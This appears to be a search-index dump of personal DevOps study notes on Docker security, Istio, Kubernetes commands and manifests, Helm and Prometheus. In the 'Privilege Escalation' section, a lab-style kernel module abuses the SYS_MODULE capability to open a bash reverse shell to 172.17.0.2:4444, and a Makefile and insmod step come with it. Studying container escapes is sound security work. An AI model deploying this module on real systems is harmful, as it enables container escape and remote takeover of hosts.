https://docs.docker.com/engine/security/security/ BretFisher: What security concerns should I have with Docker? How should I go about locking it down? https://github.com/BretFisher/ama/issues/17 Shifting Docker security left: https://snyk.io/blog/shifting-docker-security-left/ At DockerCon: \"Building a Docker Image Packaging Pipeline Using GitHub Actions\": https://docker.events.cube365.net/docker/dockercon/content/Videos/SPWM3BdnCZWPN4fN9 At DockerCon: \"Your Container Has Vulnerabilities. Now What?\" https://docker.events.cube365.net/docker/dockercon/content/Videos/GZpzJAapdrSXohzNz","title":"Security References"},{"location":"devops/docker/#privilege-escalation","text":"\u200bCapabilities: capsh --print SYS_MODULE capability \u200b ip addr The call_usermodehelper function is used to create user mode processes from kernel space. The call_usermodehelper function takes three parameters: argv, envp and UMH_WAIT_EXEC The arguments to the program are stored in argv. The environment variables are stored in envp. UMH_WAIT_EXEC causes the kernel module to wait till the loader executes the program. Reference https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html Invoking user-space applications from the kernel: https://developer.ibm.com/articles/l-user-space-apps/ Usermode Helper API: https://insujang.github.io/2017-05-10/usermode-helper-api/ // reverse-shell.c #include linux/kmod.h #include linux/module.h MODULE_LICENSE ( GPL ); MODULE_AUTHOR ( AttackDefense ); MODULE_DESCRIPTION ( LKM reverse shell module ); MODULE_VERSION ( 1.0 ); char * argv [] = { /bin/bash , -c , bash -i /dev/tcp/172.17.0.2/4444 0 1 , NULL }; static char * envp [] = { PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin , NULL }; static int __init reverse_shell_init ( void ) { return call_usermodehelper ( argv [ 0 ], argv , envp , UMH_WAIT_EXEC ); } static void __exit reverse_shell_exit ( void ) { printk ( KERN_INFO Exiting \\n ); } module_init ( reverse_shell_init ); module_exit ( reverse_shell_exit ); # Makefile # make # \u200b insmod reverse-shell.ko obj-m += reverse-shell.o all : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) modules clean : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) clean","title":"Privilege Escalation"},{"location":"devops/istio/","text":"Istio https://istio.io/latest/docs/concepts/what-is-istio/ Enable sidecar injection Add label using kubectl kubectl describe ns default kubectl label ns default istio - injection = enabled Add same label using Yamls( metadata - label ) Kiali - visualization Architecture Proxies (sidecar) Example: isUserLoggedIn micro service security check Envoy is the proxy L7 proxy and communication bus designed for large modern service oriented architectures Self contained process that is designed to run alongside every application server Primarily designed as a service to service communication system A single Envoy deployment can form a mesh between Java, C++, Go, PHP, Python, etc. Envoy can be deployed and upgraded quickly across an entire infrastructure transparently. (where as library update is painful) Envoy is an L3/L4 network proxy. A pluggable filter chain mechanism allows filters to be written to perform different TCP proxy tasks and inserted into the main server. Filters have already been written to support various tasks such as raw TCP proxy, HTTP proxy, TLS client certificate authentication, etc. Envoy supports an additional HTTP L7 filter layer . HTTP filters can be plugged into the HTTP connection management subsystem that perform different tasks such as buffering, rate limiting, routing/forwarding, sniffing Amazon\u2019s DynamoDB, etc. First class HTTP/2 support : supports both HTTP/1.1 and HTTP/2 -** HTTP L7 routing**: When operating in HTTP mode, Envoy supports a routing subsystem that is capable of routing and redirecting requests based on path, authority, content type, runtime values, etc. gRPC support : gRPC is an RPC framework from Google that uses HTTP/2 as the underlying multiplexed transport MongoDB L7 support / DynamoDB L7 support Service discovery and dynamic configuration: Envoy optionally consumes a layered set of dynamic configuration APIs for centralized management. Envoy includes a health checking subsystem which can optionally perform active health checking of upstream service clusters. Envoy includes support for automatic retries, circuit breaking, global rate limiting via an external rate limiting service, request shadowing, and outlier detection. Envoy includes enough features to make it usable as an edge proxy for most modern web application use cases. This includes TLS termination, HTTP/1.1 and HTTP/2 support, as well as HTTP L7 routing. Envoy includes robust statistics support for all subsystems Control Plane Galley: Read k8s yaml and transform it to internal structure that istio understands Pilot: Take istio's internal representation and broadcast that to envoy Citadel: Managing TLS certificates Mixer: Got replaced. Responsible for impl. policy checks and telemetry (Mixer get telemetry from Envoy) Galley provide input to Mixer. Mixer communicate with Envoy. Data Plane Telemetry Sidecar running in each pod to monitor Control must be running (Mixer/Telemetry) Kiali Port 31000 High-level Doesn't give view of individual requests OpenTracing - Jaeger / Zipkin Applications must propagate x-request-id and x-b3-* headers Or will end up creating several traces Grafana - for specific problems Traffic Management Canary Releases - Release to live for small % of incoming requests K8s Native way is to use Deployments where version is incremented In istio use Version Grouping In Kiali: Versioned app Graph Label: app : to show Application in Kiali Label: version : to show Version information in Kiali Kiali: Service - Create Weighted Routing Virtual Service : Enable configuring custom routing rules (custom routing) When applying Virtual Service , Galley read the YAML and then send to Pilot which make config changes to Proxies Envoy is doing the traffic management Istio is facilitating the update of all proxies in one go easily subset defined in Destination Rule Destination Rule : Define which pods (versions) should be part of subset Load Balancing a Virtual Service Hash - Odd Even splitting - consistentHash Hash based on, header, cookie or source IP Doesn't work with weighted subsets. Weighting apply first. LB will have only one instance. Istio Ingress Gateway Edge proxy Create Gateway (kind) Configure gateway of VirtualService to point to new Gateway NodePort ingress gateways, access from browsers only supported with host is * in VirtualService (LoadBalancer is expected) Prefix based routing / Header based routing Match in VirtualService Dark Releases based on headers Fault Injection VirtualService - fault - delay Chaoses Engineering Circuit Breaker - Mentioned in \"Release It! Second Edition\" Cascading failure. One failure leading to another, and ultimately result in a bigger issue. If too many requests are failing, stop relaying requests and fail fast without delaying (check back later). Hystrix to build such logic into the application Correct way would be to build it out side of the micro service (istio proxy) Outlier Detection Destination Rule - trafficPolicy - outlierDetection https://istio.io/latest/docs/reference/config/networking/destination-rule/#OutlierDetection https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/upstream/outlier Mutual TLS Fallacies of distributed computing The network is homogeneous K8s cluster is actually a multi node (mult zone also) deployment https://en.wikipedia.org/wiki/Fallacies_of_distributed_computing Difficult to manually do this: Reveal, synchronization CAs App should be using HTTPS No enforcement Citadel is responsible of configuring proxies with required certificates What to do: Block all non TLS traffic using policy Auto update all proxy to proxy communication to mTLS Kiali - Display - Security Types: Promiscuous mTLS - Default behavior if istio cannot upgrade connection to mTLS (sending side doesn't have proxy), leave it as HTTP and serve (insecure) Can be blocked by AUthentication Proxy https://istio.io/latest/docs/concepts/security/#authentication-policies Strict - IstioCTL istioctl manifest apply : Installing default profile of istio to cluster Profiles: https://istio.io/latest/docs/setup/additional-setup/config-profiles/ https://istio.io/latest/docs/setup/install/istioctl/#customizing-the-configuration istioctl manifest apply --set profile=default --set addonComponents.kiali.enabled=true https://istio.io/latest/docs/setup/install/istioctl/#display-the-configuration-of-a-profile IstioOperator Options has options related to configurations: https://istio.io/latest/docs/reference/config/istio.operator.v1alpha1/ istio profile dump - Dump default profile YAML istio profile dump demo - Dump demo profile YAML (UTF-16) Modify the profile to: Change the resource requirements based on periodical analysis of usage Demo profile have certain debugging enabled (GODEBUG) Demo profile only capture ~1% of tracing inputs (PILOT_TRACING_SAMPLING) .:. Start with Default profile and alter the file based on requirement Apply modified file by: istioctl manifest apply - f settings . yaml Will fail back to First party JWT tokens from Third party JWT (which is less secure). Minikube doesn't support Third Party JWT. Hence use --set values.global.jwtPolicy=third-party-jwt or --set values.global.jwtPolicy=first-party-jwt to select the desired. In minikube select 1 st . https://istio.io/latest/docs/ops/best-practices/security/ Third Party JWT use: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#service-account-token-volume-projection Verify with: kubectl get po - n istio - system In a KOPS cluster, enable 1 st party JWT by: Use --set values.global.jwtPolicy=first-party-jwt or kops edit cluster and then: Add defined items into spec section: https://kops.sigs.k8s.io/operations/service_account_token_volumes/ Creating standard K8S Yamls istioctl manifest generate - f raw_yaml_file . yaml Had to change the order of istio - system namespace and move it to top If you want to access the add on components - Kiali, Grafana and Jaeger - through a browser, you should be able to configure NodePorts using the IstioOperator API. kiali : enabled : true k8s : replicaCount : 1 service : type : NodePort ports : - port : 20001 nodePort : 31000 Non root se-linux","title":"Istio"},{"location":"devops/istio/#istio","text":"https://istio.io/latest/docs/concepts/what-is-istio/ Enable sidecar injection Add label using kubectl kubectl describe ns default kubectl label ns default istio - injection = enabled Add same label using Yamls( metadata - label ) Kiali - visualization Architecture Proxies (sidecar) Example: isUserLoggedIn micro service security check Envoy is the proxy L7 proxy and communication bus designed for large modern service oriented architectures Self contained process that is designed to run alongside every application server Primarily designed as a service to service communication system A single Envoy deployment can form a mesh between Java, C++, Go, PHP, Python, etc. Envoy can be deployed and upgraded quickly across an entire infrastructure transparently. (where as library update is painful) Envoy is an L3/L4 network proxy. A pluggable filter chain mechanism allows filters to be written to perform different TCP proxy tasks and inserted into the main server. Filters have already been written to support various tasks such as raw TCP proxy, HTTP proxy, TLS client certificate authentication, etc. Envoy supports an additional HTTP L7 filter layer . HTTP filters can be plugged into the HTTP connection management subsystem that perform different tasks such as buffering, rate limiting, routing/forwarding, sniffing Amazon\u2019s DynamoDB, etc. First class HTTP/2 support : supports both HTTP/1.1 and HTTP/2 -** HTTP L7 routing**: When operating in HTTP mode, Envoy supports a routing subsystem that is capable of routing and redirecting requests based on path, authority, content type, runtime values, etc. gRPC support : gRPC is an RPC framework from Google that uses HTTP/2 as the underlying multiplexed transport MongoDB L7 support / DynamoDB L7 support Service discovery and dynamic configuration: Envoy optionally consumes a layered set of dynamic configuration APIs for centralized management. Envoy includes a health checking subsystem which can optionally perform active health checking of upstream service clusters. Envoy includes support for automatic retries, circuit breaking, global rate limiting via an external rate limiting service, request shadowing, and outlier detection. Envoy includes enough features to make it usable as an edge proxy for most modern web application use cases. This includes TLS termination, HTTP/1.1 and HTTP/2 support, as well as HTTP L7 routing. Envoy includes robust statistics support for all subsystems Control Plane Galley: Read k8s yaml and transform it to internal structure that istio understands Pilot: Take istio's internal representation and broadcast that to envoy Citadel: Managing TLS certificates Mixer: Got replaced. Responsible for impl. policy checks and telemetry (Mixer get telemetry from Envoy) Galley provide input to Mixer. Mixer communicate with Envoy. Data Plane Telemetry Sidecar running in each pod to monitor Control must be running (Mixer/Telemetry) Kiali Port 31000 High-level Doesn't give view of individual requests OpenTracing - Jaeger / Zipkin Applications must propagate x-request-id and x-b3-* headers Or will end up creating several traces Grafana - for specific problems Traffic Management Canary Releases - Release to live for small % of incoming requests K8s Native way is to use Deployments where version is incremented In istio use Version Grouping In Kiali: Versioned app Graph Label: app : to show Application in Kiali Label: version : to show Version information in Kiali Kiali: Service - Create Weighted Routing Virtual Service : Enable configuring custom routing rules (custom routing) When applying Virtual Service , Galley read the YAML and then send to Pilot which make config changes to Proxies Envoy is doing the traffic management Istio is facilitating the update of all proxies in one go easily subset defined in Destination Rule Destination Rule : Define which pods (versions) should be part of subset Load Balancing a Virtual Service Hash - Odd Even splitting - consistentHash Hash based on, header, cookie or source IP Doesn't work with weighted subsets. Weighting apply first. LB will have only one instance. Istio Ingress Gateway Edge proxy Create Gateway (kind) Configure gateway of VirtualService to point to new Gateway NodePort ingress gateways, access from browsers only supported with host is * in VirtualService (LoadBalancer is expected) Prefix based routing / Header based routing Match in VirtualService Dark Releases based on headers Fault Injection VirtualService - fault - delay Chaoses Engineering Circuit Breaker - Mentioned in \"Release It! Second Edition\" Cascading failure. One failure leading to another, and ultimately result in a bigger issue. If too many requests are failing, stop relaying requests and fail fast without delaying (check back later). Hystrix to build such logic into the application Correct way would be to build it out side of the micro service (istio proxy) Outlier Detection Destination Rule - trafficPolicy - outlierDetection https://istio.io/latest/docs/reference/config/networking/destination-rule/#OutlierDetection https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/upstream/outlier Mutual TLS Fallacies of distributed computing The network is homogeneous K8s cluster is actually a multi node (mult zone also) deployment https://en.wikipedia.org/wiki/Fallacies_of_distributed_computing Difficult to manually do this: Reveal, synchronization CAs App should be using HTTPS No enforcement Citadel is responsible of configuring proxies with required certificates What to do: Block all non TLS traffic using policy Auto update all proxy to proxy communication to mTLS Kiali - Display - Security Types: Promiscuous mTLS - Default behavior if istio cannot upgrade connection to mTLS (sending side doesn't have proxy), leave it as HTTP and serve (insecure) Can be blocked by AUthentication Proxy https://istio.io/latest/docs/concepts/security/#authentication-policies Strict - IstioCTL istioctl manifest apply : Installing default profile of istio to cluster Profiles: https://istio.io/latest/docs/setup/additional-setup/config-profiles/ https://istio.io/latest/docs/setup/install/istioctl/#customizing-the-configuration istioctl manifest apply --set profile=default --set addonComponents.kiali.enabled=true https://istio.io/latest/docs/setup/install/istioctl/#display-the-configuration-of-a-profile IstioOperator Options has options related to configurations: https://istio.io/latest/docs/reference/config/istio.operator.v1alpha1/ istio profile dump - Dump default profile YAML istio profile dump demo - Dump demo profile YAML (UTF-16) Modify the profile to: Change the resource requirements based on periodical analysis of usage Demo profile have certain debugging enabled (GODEBUG) Demo profile only capture ~1% of tracing inputs (PILOT_TRACING_SAMPLING) .:. Start with Default profile and alter the file based on requirement Apply modified file by: istioctl manifest apply - f settings . yaml Will fail back to First party JWT tokens from Third party JWT (which is less secure). Minikube doesn't support Third Party JWT. Hence use --set values.global.jwtPolicy=third-party-jwt or --set values.global.jwtPolicy=first-party-jwt to select the desired. In minikube select 1 st . https://istio.io/latest/docs/ops/best-practices/security/ Third Party JWT use: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#service-account-token-volume-projection Verify with: kubectl get po - n istio - system In a KOPS cluster, enable 1 st party JWT by: Use --set values.global.jwtPolicy=first-party-jwt or kops edit cluster and then: Add defined items into spec section: https://kops.sigs.k8s.io/operations/service_account_token_volumes/ Creating standard K8S Yamls istioctl manifest generate - f raw_yaml_file . yaml Had to change the order of istio - system namespace and move it to top If you want to access the add on components - Kiali, Grafana and Jaeger - through a browser, you should be able to configure NodePorts using the IstioOperator API. kiali : enabled : true k8s : replicaCount : 1 service : type : NodePort ports : - port : 20001 nodePort : 31000 Non root se-linux","title":"Istio"},{"location":"devops/kubernetes/","text":"Quick Reference Minikube starts minikube minikube start stops the minikube virtual machine minikube stop completely wipe away the minikube image. Also you can delete all files in /.minikube and /.kube. minikube delete find out the required environment variables to connect to the docker daemon running in minikube minikube env find out the ip address of minikube. Needed for browser access. minikube ip Kubectl get help kubectl explain pods list all namespaces kubectl get ns list all objects that you\u2019ve created. Pods at first, later, ReplicaSets, Deployments and Services kubectl get all either creates or updates resources depending on the contents of the yaml file - kubectl apply \u2013 f yaml file apply all yaml files found in the current directory kubectl apply \u2013 f . gives full information about the specified pod kubectl describe pod name of pod gives full information about the specified service kubectl describe svc name of pod view pod logs kubectl logs { pod - name } Events kubectl get events --sort-by=.metadata.creationTimestamp execute the specified command in the pod\u2019s container. Doesn\u2019t work well in Cygwin. kubectl exec \u2013 it pod name command get all pods or services. Later in the course, replicasets and deployments. kubectl get ( pod | po | service | svc | rs | replicaset | deployment | deploy ) get all pods and their labels kubectl get po -- show - labels get all pods matching the specified name:value pair kubectl get po -- show - labels - l { name } = { value } delete the named pod. Can also delete svc, rs, deploy kubectl delete po pod name delete all pods (also svc, rs, deploy) kubectl delete po --all Monitor changes: --watch Diff: kubectl diff - f example . yaml CPU/Memory usage: kubectl top pods Deployment Management create: kubectl create deployment example --image= image-name expose: kubectl expose deployment example --type=LoadBalancer scale: kubectl scale deployment example --replicas=3 get the status of the named deployment kubectl rollout status deploy name of deployment get the previous versions of the deployment kubectl rollout history deploy name of deployment go back one version in the deployment. Also optionally --to-revision=\\ revision_number> We recommend this is used only in stressful emergency situations! Your YAML will now be out of date with the live deployment! kubectl rollout undo deploy name of deployment Manual rollouts: kubectl rollout history deployment hello - world - rest - api kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 3 . RELEASE --record=true kubectl rollout undo deployment hello - world - rest - api --to-revision=1 Volumes list PersistentVolumeClaims kubectl get pvc kops Create cluster kops create cluster --zone eu-west-2a,eu-west-2b ${ NAME } Edit instance-group configuration kops edit ig Update cluster kops update cluster ${ NAME } --yes Validate cluster kops validate cluster Delete cluster kops delete cluster --name ${ NAME } --yes kubectl create deployment hello - world - rest - api --image=in28min/hello-world-rest-api:0.0.1.RELEASE kubectl expose deployment hello - world - rest - api --type=LoadBalancer --port=8080 kubectl scale deployment hello - world - rest - api --replicas=3 kubectl delete pod hello - world - rest - api - 58 ff5dd898 - 62 l9d kubectl autoscale deployment hello - world - rest - api --max=10 --cpu-percent=70 kubectl edit deployment hello - world - rest - api # minReadySeconds : 15 kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE gcloud container clusters get - credentials in28minutes - cluster --zone us-central1-a --project solid-course-258105 kubectl create deployment hello - world - rest - api --image=in28min/hello-world-rest-api:0.0.1.RELEASE kubectl expose deployment hello - world - rest - api --type=LoadBalancer --port=8080 kubectl set image deployment hello - world - rest - api hello - world - rest - api = DUMMY_IMAGE : TEST kubectl get events --sort-by=.metadata.creationTimestamp kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE kubectl get events --sort-by=.metadata.creationTimestamp kubectl get componentstatuses kubectl get pods --all-namespaces kubectl get events kubectl get pods kubectl get replicaset kubectl get deployment kubectl get service kubectl get pods - o wide kubectl explain pods kubectl get pods - o wide kubectl describe pod hello - world - rest - api - 58 ff5dd898 - 9 trh2 kubectl get replicasets kubectl get replicaset kubectl scale deployment hello - world - rest - api --replicas=3 kubectl get pods kubectl get replicaset kubectl get events kubectl get events --sort.by=.metadata.creationTimestamp kubectl get rs kubectl get rs - o wide kubectl set image deployment hello - world - rest - api hello - world - rest - api = DUMMY_IMAGE : TEST kubectl get rs - o wide kubectl get pods kubectl describe pod hello - world - rest - api - 85995 ddd5c - msjsm kubectl get events --sort-by=.metadata.creationTimestamp kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE kubectl get events --sort-by=.metadata.creationTimestamp kubectl get pods - o wide kubectl delete pod hello - world - rest - api - 67 c79fd44f - n6c7l kubectl get pods - o wide kubectl delete pod hello - world - rest - api - 67 c79fd44f - 8 bhdt kubectl get componentstatuses kubectl get pods --all-namespaces gcloud auth login kubectl version gcloud container clusters get - credentials in28minutes - cluster --zone us-central1-a --project solid-course-258105 kubectl logs hello - world - rest - api - 58 ff5dd898 - 6 ctr2 kubectl logs - f hello - world - rest - api - 58 ff5dd898 - 6 ctr2 kubectl get deployment hello - world - rest - api - o yaml kubectl get deployment hello - world - rest - api - o yaml deployment . yaml kubectl get service hello - world - rest - api - o yaml service . yaml kubectl apply - f deployment . yaml kubectl get all - o wide kubectl delete all - l app = hello - world - rest - api kubectl get svc --watch kubectl diff - f deployment . yaml kubectl delete deployment hello - world - rest - api kubectl get all - o wide kubectl delete replicaset . apps / hello - world - rest - api - 797 dd4b5dc kubectl get pods --all-namespaces kubectl get pods --all-namespaces -l app=hello-world-rest-api kubectl get services --all-namespaces kubectl get services --all-namespaces --sort-by=.spec.type kubectl get services --all-namespaces --sort-by=.metadata.name kubectl cluster - info kubectl cluster - info dump kubectl top node kubectl top pod kubectl get services kubectl get svc kubectl get ev kubectl get rs kubectl get ns kubectl get nodes kubectl get no kubectl get pods kubectl get po kubectl delete all - l app = hello - world - rest - api kubectl get all kubectl apply - f deployment . yaml kubectl apply - f .. / currency - conversion / deployment . yaml Yamls apiVersion : kind : metadata : spec : Pod The basic execution unit of a Kubernetes application--the smallest and simplest unit in the Kubernetes object model that you create or deploy. A Pod represents processes running on your cluster. Init container Run before the app containers are started. Init containers always run to completion. Each init container must complete successfully before the next one starts. If a Pod's init container fails, Kubernetes repeatedly restarts the Pod until the init container succeeds. However, if the Pod has a restartPolicy of Never, Kubernetes does not restart the Pod. https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#pod-v1-core apiVersion : v1 kind : Pod metadata : name : pod-example spec : containers : - name : ubuntu image : ubuntu:trusty command : [ echo ] args : [ Hello World ] ReplicaSet Maintain a stable set of replica Pods running at any given time. As such, it is often used to guarantee the availability of a specified number of identical Pods https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#replicaset-v1-apps apiVersion : apps/v1 kind : ReplicaSet metadata : # Unique key of the ReplicaSet instance name : replicaset-example spec : # 3 Pods should exist at all times. replicas : 3 selector : matchLabels : app : nginx template : metadata : labels : app : nginx spec : containers : # Run the nginx image - name : nginx image : nginx:1.14 Deployment Deployment provides declarative updates for Pods and ReplicaSets. You describe a desired state in a Deployment, and the Deployment Controller changes the actual state to the desired state at a controlled rate. https://kubernetes.io/docs/concepts/workloads/controllers/deployment/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#deployment-v1-apps apiVersion : apps/v1 kind : Deployment metadata : # Unique key of the Deployment instance name : deployment-example spec : # 3 Pods should exist at all times. replicas : 3 selector : matchLabels : app : nginx template : metadata : labels : # Apply this label to pods and default # the Deployment label selector to this value app : nginx spec : containers : - name : nginx # Run this image image : nginx:1.14 DaemonSet A DaemonSet ensures that all (or some) Nodes run a copy of a Pod. As nodes are added to the cluster, Pods are added to them. As nodes are removed from the cluster, those Pods are garbage collected. running a cluster storage daemon on every node running a logs collection daemon on every node running a node monitoring daemon on every node https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#daemonset-v1-apps apiVersion : apps/v1 kind : DaemonSet metadata : # Unique key of the DaemonSet instance name : daemonset-example spec : selector : matchLabels : app : daemonset-example template : metadata : labels : app : daemonset-example spec : containers : # This container is run once on each Node in the cluster - name : daemonset-example image : ubuntu:trusty command : - /bin/sh args : - -c # This script is run through `sh -c script ` - - while [ true ]; do echo DaemonSet running on $(hostname) ; sleep 10 ; done Service https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#service-v1-core kind : Service apiVersion : v1 metadata : # Unique key of the Service instance name : service-example spec : ports : # Accept traffic sent to port 80 - name : http port : 80 targetPort : 80 selector : # Loadbalance traffic across Pods matching # this label selector app : nginx # Create an HA proxy in the cloud provider # with an External IP address - *Only supported # by some cloud providers* type : LoadBalancer Volume and VolumeMounts apiVersion : v1 kind : Pod metadata : name : pv-recycler namespace : default spec : restartPolicy : Never volumes : - name : vol hostPath : path : /any/path/it/will/be/replaced containers : - name : pv-recycler image : k8s.gcr.io/busybox command : [ /bin/sh , -c , test -e /scrub rm -rf /scrub/..?* /scrub/.[!.]* /scrub/* test -z \\ $(ls -A /scrub)\\ || exit 1 ] volumeMounts : - name : vol mountPath : /scrub PersistentVolumeClaims apiVersion : v1 kind : PersistentVolumeClaim metadata : name : my-pvc spec : storageClassName : my-ssd-local-storage # Find matching storage class accessModes : - ReadWriteOnce # Find matching access mode resources : requests : storage : 8Gi # Find 8Gi of storage apiVersion : v1 kind : PersistentVolume metadata : name : my-local-storage spec : storageClassName : my-ssd-local-storage capacity : storage : 8Gi accessModes : - ReadWriteOnce hostPath : path : /mnt/somedir type : DirectoryOrCreate apiVersion : v1 kind : Pod metadata : name : mypod spec : containers : - name : myfrontend image : nginx volumeMounts : - mountPath : /var/www/html name : mypd volumes : - name : mypd persistentVolumeClaim : claimName : my-pvc StorageClass and Binding Change reclaim policy as required # What do want? apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mongo-pvc spec : storageClassName : cloud-ssd accessModes : - ReadWriteOnce resources : requests : storage : 7Gi --- # How do we want it implemented apiVersion : storage.k8s.io/v1 kind : StorageClass metadata : name : cloud-ssd provisioner : kubernetes.io/aws-ebs parameters : type : gp2 StatefulSet Set StatefulSet is the workload API object used to manage stateful applications. Stable, unique network identifiers. Stable, persistent storage. Ordered, graceful deployment and scaling. Ordered, automated rolling updates. Like a Deployment, a StatefulSet manages Pods that are based on an identical container spec. Unlike a Deployment, a StatefulSet maintains a sticky identity for each of their Pods. These pods are created from the same spec, but are not interchangeable: Each has a persistent identifier that it maintains across any rescheduling. https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/ RBAC https://kubernetes.io/docs/reference/access-authn-authz/rbac/ Kind - Role - ClusterRole to grant cluster-wide permissions. apiVersion : rbac.authorization.k8s.io/v1 kind : Role metadata : namespace : default name : pod-reader rules : - apiGroups : [ ] # indicates the core API group resources : [ pods ] verbs : [ get , watch , list ] apiVersion : rbac.authorization.k8s.io/v1 # This role binding allows jane to read pods in the default namespace. # You need to already have a Role named pod-reader in that namespace. kind : RoleBinding metadata : name : read-pods namespace : default subjects : # You can specify more than one subject - kind : User name : jane # name is case sensitive apiGroup : rbac.authorization.k8s.io roleRef : # roleRef specifies the binding to a Role / ClusterRole kind : Role #this must be Role or ClusterRole name : pod-reader # this must match the name of the Role or ClusterRole you wish to bind to apiGroup : rbac.authorization.k8s.io ConfigMap apiVersion : v1 kind : ConfigMap metadata : creationTimestamp : 2016-02-18T18:52:05Z name : game-config namespace : default resourceVersion : 516 uid : b4952dc3-d670-11e5-8cd0-68f728db1985 data : game.properties : | enemies=aliens lives=3 enemies.cheat=true enemies.cheat.level=noGoodRotten secret.code.passphrase=UUDDLRLRBABAS secret.code.allowed=true secret.code.lives=30 ui.properties : | color.good=purple color.bad=yellow allow.textmode=true how.nice.to.look=fairlyNice kubectl create configmap game - config - 2 --from-file=configure-pod-container/configmap/game.properties Secret apiVersion : v1 kind : Secret metadata : name : mysecret type : Opaque data : username : YWRtaW4= password : MWYyZDFlMmU2N2Rm apiVersion : v1 kind : Secret metadata : name : mysecret type : Opaque stringData : config.yaml : |- apiUrl: https://my.api.com/api/v1 username: {{username}} password: {{password}} Ingress apiVersion : networking.k8s.io/v1beta1 kind : Ingress metadata : name : test-ingress annotations : nginx.ingress.kubernetes.io/rewrite-target : / spec : rules : - host : domain1.com http : paths : - path : /testpath pathType : Prefix backend : serviceName : test servicePort : 80 - host : domain2.com Job apiVersion : batch/v1 kind : Job metadata : name : pi spec : template : spec : containers : - name : pi image : perl command : [ perl , -Mbignum=bpi , -wle , print bpi(2000) ] restartPolicy : Never backoffLimit : 4 CronJob apiVersion : batch/v1beta1 kind : CronJob metadata : name : hello spec : schedule : */1 * * * * jobTemplate : spec : template : spec : containers : - name : hello image : busybox args : - /bin/sh - -c - date; echo Hello from the Kubernetes cluster restartPolicy : OnFailure Cloud Deployments Kops https://kops.sigs.k8s.io/ https://kops.sigs.k8s.io/getting_started/commands/ Notes bretfisher Courses - Kubernetes Mastery: Hands-On Lessons From A Docker Captain: https://www.bretfisher.com/courses/ Threat matrix for Kubernetes - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ Pod Security Policies: https://kubernetes.io/docs/concepts/policy/pod-security-policy/ https://www.jaegertracing.io/docs/1.18/ Stay current in k8s Harden nodes Restrict network via RBAC Use namespaces and network policies Slim down images Logs - k8s audit / k8s rbac audit logs / Follows single responsibility concept Cluster Master Node - Manage Cluster API Server ( kube - apiserver ) Distributed Database ( etcd ) Scheduler ( kube - scheduler ) Controller Manager ( kube - controller - manager ) Worker Nodes - Run Applications Node Agent ( kubelet ) Interacts with kube - apiserver Networking Component ( kube - proxy ) Container Runtime (CRI-OCI/docker/rkt) PODS Service Pods are not visible outside k8s cluster K8s service is a long running object with IP address and stable fixed port usable to expose Pods out of k8s cluster Pod can have \"Label\" (key value pairs) Service can have \"Selector\" (key value pairs) Service will look for any matching key-value pairs when binding a service to a pod (selector / label) Service Types: NodePort Expose a port through the node Port needs to be greater than 30,000 Configure port and nodeport ClusterIP Internal service / not exposed to external traffic but exposed to internal nodes LoadBalancer Pod may die for many reasons: If pod take too many resources If node failed (all pods in that node die) ReplicaSets Add replica count into pod definition Change kind to ReplicaSet Nest pod definition in template spec attribute Remove pod names Add selector block (similar to services ) Deployment Automatic rolling update with rollbacks Networking Service Discovery Same Pod - can be accessed via localhost Kube-dns - Resolve service name to IP address Namespaces Partitioning resources into separate areas kubectl get ns get list of namespaces kubectl get all - n kube - system list resources from a namespace FQDN - database - database . mynamespace - database . mynamespace . svc . cluster . local (last part is appended by DNS) Check / etc / resolve . conf Expand memory: minikube stop minikube delete rm - rf ~/ . kube and rm - rf ~/ . minikube minikube start --memory 4096 Microservices changing one part is hard without affecting other complications of release coordination (big bang releases) shared global databases (integration databases) microservices as extreme form of modularity no direct communication in between interfaces for communication totally independent limit to one specific area of business function highly cohesive and loosely coupled database is split Domain-driven Design (Eric Evans) - Bounded Context https://github.com/DickChesterwood/k8s-fleetman need api gateway to expose backend functions (microservices) single point of entry to system https://microservices.io/patterns/apigateway.html Common Cluster Configurations: https://github.com/kubernetes/kubernetes/tree/master/cluster/addons ElasticStack + (LogStash / FluentD) Helm - Package management for k8s helm init helm version https://github.com/helm/charts helm repo update helm install stable / mysql --set mysqlPassword=example --name my-mysql Fix permissions: kubectl create serviceaccount --namespace kube-system tiller kubectl create clusterrolebinding tiller-cluster-rule --clusterrole = cluster-admin --serviceaccount = kube-system:tiller kubectl patch deploy --namespace kube-system tiller-deploy -p { spec :{ template :{ spec :{ serviceAccount : tiller }}}} Prometheus / Grafana (UI) helm install stable / prometheus - operator --name my-monitoring --namespace monitoring To see how this works kops edit cluster --name prometheus-oper-prometheus change type to LoadBalancer and access UI(9090/graph)) To get a full set of data from Prometheus: kops edit cluster --name ${ NAME } kubelet: anonymousAuth: false authenticationTokenWebhook: true authorizationMode: Webhook kops update cluster --yes kops rolling-update cluster --yes prometheus - operator failed : rpc error : code = Canceled https://github.com/helm/helm/issues/6130 helm del --purge monitoring helm install --name monitoring --namespace monitoring stable/prometheus-operator --set prometheusOperator.createCustomResource=false AlertManager over / api Dead man's switch - Constantly alerting. Stops if an alert is fired (or Prometheus is down) Slack integration Incoming web-hook Listen for Dead man's switch https://prometheus.io/docs/alerting/latest/configuration/ alertmanager . yaml global : 